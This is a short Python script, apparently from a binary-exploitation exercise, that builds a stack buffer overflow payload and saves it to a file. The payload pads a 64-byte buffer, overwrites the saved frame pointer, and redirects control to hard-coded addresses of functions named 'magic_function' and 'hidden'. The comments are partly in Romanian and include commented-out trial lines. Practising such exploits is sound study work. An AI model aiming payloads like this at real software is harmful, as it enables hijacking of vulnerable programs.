buffer_size = 64
value = 0xcafebabe
fini = 0xdeadbeef
address_magic_function = 0x08049199
hid = 0x08049182

# Create payload
#payload = value.to_bytes(4, 'little')  # Value to be written in saved frame pointer
payload = b'A' * buffer_size  # Fill the buffer
# Doar cu astea merge
# payload = value.to_bytes(4, 'little')
# for i in range(73):
    # payload += value.to_bytes(4, 'little')  # Value to be written in saved frame pointer
payload += value.to_bytes(4, 'little')  # Value to be written in saved frame pointer
payload += b'A' * 4 # dc sunt 3 bytes intre ei? Alta intrebare!
# payload += value.to_bytes(4, 'little')  # Value to be written in saved frame pointer
# payload += value.to_bytes(4, 'little')  # Value to be written in saved frame pointer
# payload += value.to_bytes(4, 'little')  # Value to be written in saved frame pointer
payload += address_magic_function.to_bytes(4, 'little')  # Address of magic_function
# payload += b'A' * 4
payload += b'\n'
payload += b'A' * 68
payload += hid.to_bytes(4, 'little') # address of hidden
payload += fini.to_bytes(4, 'little')  # Arg of vuln




# Write length of payload and payload to a file
with open('payload.bin', 'wb') as f:
    f.write(payload)